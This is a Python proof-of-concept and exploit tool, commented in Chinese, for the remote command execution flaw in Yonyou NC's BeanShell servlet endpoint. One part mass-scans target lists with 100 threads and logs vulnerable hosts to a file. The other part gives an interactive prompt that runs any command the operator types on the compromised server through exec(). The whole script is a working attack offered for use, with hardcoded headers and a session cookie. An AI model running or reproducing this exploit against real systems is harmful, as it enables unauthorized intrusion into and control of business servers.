# 用友命令执行
# /servlet/~ic/bsh.servlet.BshServlet 它可以输入命令 进而导致命令执行
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """
     █████                      ██████   ██████
    ░░███                      ░░██████ ██████
     ░███        ██████   ██████░███░█████░███
     ░███       ░░░░░███ ███░░██░███░░███ ░███
     ░███        ███████░███ ░██░███ ░░░  ░███
     ░███      ████░░███░███ ░██░███      ░███
     ██████████░░███████░░███████████     █████                 
"""
    print(test)

def main():
    banner()
    # 处理命令行参数了
    parser = argparse.ArgumentParser(description="用友nc命令执行poc&exp")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                

def poc(target):
    headers = {
        'Content-Length':'28',
        'Cache-Control':'max-age=0',
        'Upgrade-Insecure-Requests':'1',
        'Origin':'http://8.130.46.216:8082',
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko/125.0.0.0 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer':'http://8.130.46.216:8082/servlet/~ic/bsh.servlet.BshServlet',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Cookie':'JSESSIONID=BCFBABDCFCBF9D0D7C482AF1BDFEF70D.server',
        'Connection':'close',
    }
    data = 'bsh.script=print("SIS2402")'
    payload_url = '/servlet/~ic/bsh.servlet.BshServlet'
    url = target+payload_url
    try:
        res = requests.get(url=url)
        if res.status_code == 200:
            res2 = requests.post(url=url,headers=headers,data=data)
            match = re.search(r'<pre>(.*?)</pre>',res2.text,re.S)
            # print(match.group(1))
            if 'SIS2402' in match.group(1):
                print(f"[+该url存在漏洞{target}")
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
            else:
                print(f"该url不存在漏洞{target}")
                return False
    except Exception as e:
        print(f"该url存在问题{target}"+e)
        return False

def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    while True:
        cmd = input('请输入你要执行的命令>')
        if cmd == 'q':
            print("正在退出，请等候....")
            break
        headers = {
            'Content-Length':'28',
            'Cache-Control':'max-age=0',
            'Upgrade-Insecure-Requests':'1',
            'Origin':'http://8.130.46.216:8082',
            'Content-Type':'application/x-www-form-urlencoded',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko/125.0.0.0 Safari/537.36',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer':'http://8.130.46.216:8082/servlet/~ic/bsh.servlet.BshServlet',
            'Accept-Encoding':'gzip, deflate',
            'Accept-Language':'zh-CN,zh;q=0.9',
            'Cookie':'JSESSIONID=BCFBABDCFCBF9D0D7C482AF1BDFEF70D.server',
            'Connection':'close',
        }            
        data = f'bsh.script=exec("{cmd}")'
        res = requests.post(url=target+'/servlet/~ic/bsh.servlet.BshServlet',headers=headers,data=data)
        match = re.search(r'<pre>(.*?)</pre>',res.text,re.S)
        print(match.group(1).strip())
if __name__ == '__main__':
    main()
